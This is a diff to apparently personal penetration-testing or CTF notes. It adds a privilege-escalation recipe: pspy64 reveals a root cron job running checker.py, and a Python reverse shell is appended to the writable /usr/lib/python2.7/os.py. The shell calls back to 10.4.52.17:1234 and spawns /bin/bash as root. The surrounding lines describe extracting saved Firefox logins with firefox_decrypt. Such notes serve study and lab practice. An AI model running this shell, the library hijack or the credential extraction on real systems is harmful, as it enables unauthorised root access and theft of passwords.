@@ -247,6 +247,34 @@ there is user profiles (hkf9b9xx.default-esr, b5w4643p.default-release)
 In firefox user profiles , there are important username,passwords with website logins.
 
 We can use firefox-decrypt(https://github.com/unode/firefox_decrypt) to extract username and passwords.
+_________________________________________________________________________________________________________________________________________________________________________
+pspy64 (python tool is good to look cronjob with root user permission)
+
+In crontab
+----------
+2024/03/02 00:04:01 CMD: UID=0    PID=22987  | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
+
+checker.py
+---------
+import os
+
+os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
+
+****If we get the reverse shell in checker.py, we can get /bin/bash ( root access )****
+
+/usr/lib/python2.7 is also writeable, so insert reverse shell in os.py
+
+#nano /usr/lib/python2.7/os.py (insert at the bottom)
+
+import socket
+import pty
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.4.52.17",1234))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+s.close()
 
 
 
